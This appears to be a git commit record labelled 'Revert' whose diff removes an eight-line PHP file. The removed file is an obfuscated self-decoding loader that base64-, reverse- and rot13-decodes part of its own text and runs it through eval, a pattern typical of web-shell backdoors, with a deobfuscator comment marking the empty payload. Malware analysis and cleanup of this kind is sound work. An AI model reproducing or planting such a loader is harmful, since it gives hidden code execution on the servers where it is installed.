f52b325b69552120ddf66db4f554ffb70184a6b0
sonarcloud.py <sonarcloud@localhost>
2024-06-25 17:49:52 +0200

    Revert, [skip actions].

--- 287e055fea166bf8047fc45d126702e4_original.txt.php
+++
@@ -1,8 +0,0 @@
-<?php
-
-$L66Rgr = array(0 => "<?php \$L66Rgr=explode(base64_decode(\"Pz4=\"),file_get_contents(__FILE__)); \$L6CRgr=array(base64_decode(\"L3gvaQ==\"),base64_decode(\"eA==\"),base64_decode(strrev(str_rot13(\$L66Rgr[1]))));\$L7CRgr = \"cd47db3ebba42d30b47b930fcbcc31e8\";preg_replace(\$L6CRgr[0],serialize(eval(\$L6CRgr[2])),\$L6CRgr[1]);exit();", 1 => "");
-$L6CRgr = array("/x/i", "x", "");
-$L7CRgr = "cd47db3ebba42d30b47b930fcbcc31e8";
-preg_replace($L6CRgr[0], serialize(/* #1: PHPDeobfuscator eval output */ eval(<<<'EVAL1'
-EVAL1) /* END:#1 */), $L6CRgr[1]);
-exit;
